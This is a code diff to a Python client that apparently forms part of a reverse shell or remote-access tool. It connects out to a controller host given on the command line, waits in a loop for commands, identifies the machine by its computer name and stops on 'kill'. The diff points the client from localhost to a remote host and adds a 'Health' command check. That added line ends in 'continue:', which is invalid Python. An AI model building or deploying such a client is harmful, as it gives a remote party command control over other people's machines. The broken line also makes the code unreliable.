@@ -9,10 +9,12 @@ def get_id():
     return os.environ['COMPUTERNAME']  # TODO ?find better id?
 
 
-SERVER_HOST = '127.0.0.1' #sys.argv[1]
+SERVER_HOST = sys.argv[1]
 SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
+_ENCODING__ = 'utf-8'
+__HEALTH__ = True
 
 # create the socket object
 sock = socket.socket()
@@ -32,7 +34,10 @@ while True:
     command = sock.recv(BUFFER_SIZE).decode().strip()
     if not command:
         continue
-
+    if command == 'Health':
+        #message = f'{__HEALTH__}'
+        #sock.send(message.encode(encoding=_ENCODING__))
+        continue:
     if command.lower() == 'kill':
         break  # if the command is exit, just break out of the loop
     
